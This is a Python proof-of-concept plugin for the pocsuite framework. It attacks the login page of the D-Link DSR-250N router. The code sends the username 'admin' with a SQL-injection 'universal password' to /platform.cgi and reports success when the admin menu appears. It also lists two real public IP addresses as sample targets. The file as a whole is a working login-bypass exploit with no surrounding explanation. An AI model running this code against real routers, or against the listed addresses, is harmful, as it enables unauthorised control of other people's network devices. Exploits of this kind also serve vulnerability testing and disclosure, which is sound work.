#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import urllib

class TestPOC(POCBase):
    name = 'D-link DSR-250N login bypass'
    vulID = ''
    author = ['sebao']
    vulType = 'login bypass'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''D-link登录页面，过滤不当，导致万能密码登入绕过'''

    vulDate = ''
    createDate = '2016-11-11'
    updateDate = '2016-11-11'

    appName = 'D-Link'
    appVersion = 'DSR-250N'
    appPowerLink = 'www.dlink.com'
    samples = ['http://62.173.134.250:443',
               'http://95.165.192.182:443']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        username = 'admin'
        password = "'or'a'='a"
        data = {
            'thispage': 'index.htm',
            'Users.UserName': username,
            'Users.Password': password,
            'button.login.Users.deviceStatus': 'login',
            'Login.userAgent': 'GoogleSpider'
        }
        post_data = urllib.urlencode(data)


        url = self.url + '/platform.cgi'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp = req.post(url, data=post_data, headers=headers)
        if resp.status_code == 200 and '<a href="?page=wanWizard.htm">SETUP</a>' in resp.content and '<a href="?page=deviceStatus.htm">STATUS</a>' in resp.content:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = username
                result['AdminInfo']['Password'] = password

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

